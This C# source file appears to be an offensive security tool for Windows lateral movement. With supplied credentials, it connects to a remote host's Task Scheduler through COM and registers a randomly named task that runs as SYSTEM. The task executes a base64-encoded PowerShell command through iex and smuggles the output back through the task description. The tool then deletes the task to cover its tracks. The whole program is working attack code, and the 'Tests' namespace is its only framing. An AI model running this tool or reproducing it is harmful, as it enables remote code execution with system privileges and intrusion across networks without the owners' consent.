using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime;
using System.Xml;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Text;
using System.Threading;

namespace Zcg.Tests.Windows.LateralMovement.TaskScheduler
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string srv = args[0];
                string user = args[1];
                string domain = "";

                if (user.IndexOf("\\") != -1)
                {
                    var ss = user.Split(new char[] { '\\' }, 2);
                    user = ss[1];
                    domain = ss[0];
                }
                string pass = args[2];
                string cmd = args[3];
                string tn = Guid.NewGuid().ToString();
                ITaskService t = Activator.CreateInstance(Type.GetTypeFromCLSID(Guid.Parse("0F87369F-A4E5-4CFC-BD3E-73E6154572DD"))) as ITaskService;
                t.Connect(srv, user, domain, pass);
                var enc = Convert.ToBase64String(Encoding.Unicode.GetBytes(@"$task=Get-ScheduledTask -TaskName """ + tn + "\" -TaskPath \\;$task.Description=(iex $task.Description|out-string);Set-ScheduledTask $task;[Environment]::Exit(0)"));
                var folder = t.GetFolder("\\");
                var task = folder.RegisterTask(tn,
                    string.Format(xml, cmd, enc)
                    , 0, "SYSTEM", null, TaskLogonType.ServiceAccount, null);
                task.Run(null);
                while (task.State != TaskState.Ready)
                {
                    task = folder.GetTask(tn);
                    Thread.Sleep(1000);
                }
                var xd = new XmlDocument();
                xd.LoadXml(task.Xml);
                Console.WriteLine(xd.SelectSingleNode("/*[local-name()='Task']/*[local-name()='RegistrationInfo']/*[local-name()='Description']").InnerText);
                folder.DeleteTask(tn, 0);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        static string xml = @"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.3"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <RegistrationInfo>
    <Description>{0}</Description>
  </RegistrationInfo>
  <Triggers />
  <Principals>
    <Principal id=""Author"">
      <UserId>SYSTEM</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context=""Author"">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NonInteractive -Enc ""{1}""</Arguments>
    </Exec>
  </Actions>
</Task>";

        #region task tiny
        //just a copy-paste from https://github.com/dahall/TaskScheduler
        public enum TaskLogonType
        {
            None,
            Password,
            S4U,
            InteractiveToken,
            Group,
            ServiceAccount,
            InteractiveTokenOrPassword
        }
        public enum TaskState
        {
            Unknown,
            Disabled,
            Queued,
            Ready,
            Running
        }
        [ComImport, Guid("9C86F320-DEE3-4DD1-B972-A303F26B061E"), InterfaceType(ComInterfaceType.InterfaceIsDual), System.Security.SuppressUnmanagedCodeSecurity, DefaultMember("Path")]
        internal interface IRegisteredTask
        {
            string Name { [return: MarshalAs(UnmanagedType.BStr)] get; }
            string Path { [return: MarshalAs(UnmanagedType.BStr)] get; }
            TaskState State { get; }
            bool Enabled { get; set; }
            [return: MarshalAs(UnmanagedType.Interface)]
            object Run([In, MarshalAs(UnmanagedType.Struct)] object parameters);
            [return: MarshalAs(UnmanagedType.Interface)]
            object RunEx([In, MarshalAs(UnmanagedType.Struct)] object parameters, [In] int flags, [In] int sessionID, [In, MarshalAs(UnmanagedType.BStr)] string user);
            [return: MarshalAs(UnmanagedType.Interface)]
            object GetInstances(int flags);
            DateTime LastRunTime { get; }
            int LastTaskResult { get; }
            int NumberOfMissedRuns { get; }
            DateTime NextRunTime { get; }
            object Definition { [return: MarshalAs(UnmanagedType.Interface)] get; }
            string Xml { [return: MarshalAs(UnmanagedType.BStr)] get; }
            [return: MarshalAs(UnmanagedType.BStr)]
            string GetSecurityDescriptor(int securityInformation);
            void SetSecurityDescriptor([In, MarshalAs(UnmanagedType.BStr)] string sddl, [In] int flags);
            void Stop(int flags);
        }

        [ComImport, Guid("8CFAC062-A080-4C15-9A88-AA7C2AF80DFC"), InterfaceType(ComInterfaceType.InterfaceIsDual), System.Security.SuppressUnmanagedCodeSecurity, DefaultMember("Path")]
        internal interface ITaskFolder
        {
            string Name { [return: MarshalAs(UnmanagedType.BStr)] get; }
            string Path { [return: MarshalAs(UnmanagedType.BStr)] get; }
            [return: MarshalAs(UnmanagedType.Interface)]
            ITaskFolder GetFolder([MarshalAs(UnmanagedType.BStr)] string Path);
            [return: MarshalAs(UnmanagedType.Interface)]
            object GetFolders(int flags);
            [return: MarshalAs(UnmanagedType.Interface)]
            ITaskFolder CreateFolder();
            void DeleteFolder();
            [return: MarshalAs(UnmanagedType.Interface)]
            IRegisteredTask GetTask([In, MarshalAs(UnmanagedType.BStr)] string Path);
            [return: MarshalAs(UnmanagedType.Interface)]
            object GetTasks(int flags);
            void DeleteTask([In, MarshalAs(UnmanagedType.BStr)] string Name, [In] int flags);
            [return: MarshalAs(UnmanagedType.Interface)]
            IRegisteredTask RegisterTask([In, MarshalAs(UnmanagedType.BStr)] string Path, [In, MarshalAs(UnmanagedType.BStr)] string XmlText, [In] int flags, [In, MarshalAs(UnmanagedType.Struct)] object UserId, [In, MarshalAs(UnmanagedType.Struct)] object password, [In] TaskLogonType LogonType, [In, Optional, MarshalAs(UnmanagedType.Struct)] object sddl);
            [return: MarshalAs(UnmanagedType.Interface)]
            IRegisteredTask RegisterTaskDefinition();
            [return: MarshalAs(UnmanagedType.BStr)]
            string GetSecurityDescriptor(int securityInformation);
            void SetSecurityDescriptor([In, MarshalAs(UnmanagedType.BStr)] string sddl, [In] int flags);
        }

        [ComImport, DefaultMember("TargetServer"), Guid("2FABA4C7-4DA9-4013-9697-20CC3FD40F85"), System.Security.SuppressUnmanagedCodeSecurity]
        internal interface ITaskService
        {
            [return: MarshalAs(UnmanagedType.Interface)]
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(1)]
            ITaskFolder GetFolder([In, MarshalAs(UnmanagedType.BStr)] string Path);
            [return: MarshalAs(UnmanagedType.Interface)]
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(2)]
            object GetRunningTasks(int flags);
            [return: MarshalAs(UnmanagedType.Interface)]
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(3)]
            object NewTask([In] uint flags);
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(4)]
            void Connect([In, Optional, MarshalAs(UnmanagedType.Struct)] object serverName, [In, Optional, MarshalAs(UnmanagedType.Struct)] object user, [In, Optional, MarshalAs(UnmanagedType.Struct)] object domain, [In, Optional, MarshalAs(UnmanagedType.Struct)] object password);
            [DispId(5)]
            bool Connected { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(5)] get; }
            [DispId(0)]
            string TargetServer { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0)] get; }
            [DispId(6)]
            string ConnectedUser { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(6)] get; }
            [DispId(7)]
            string ConnectedDomain { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(7)] get; }
            [DispId(8)]
            uint HighestVersion { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(8)] get; }
        }

        #endregion
    }
}




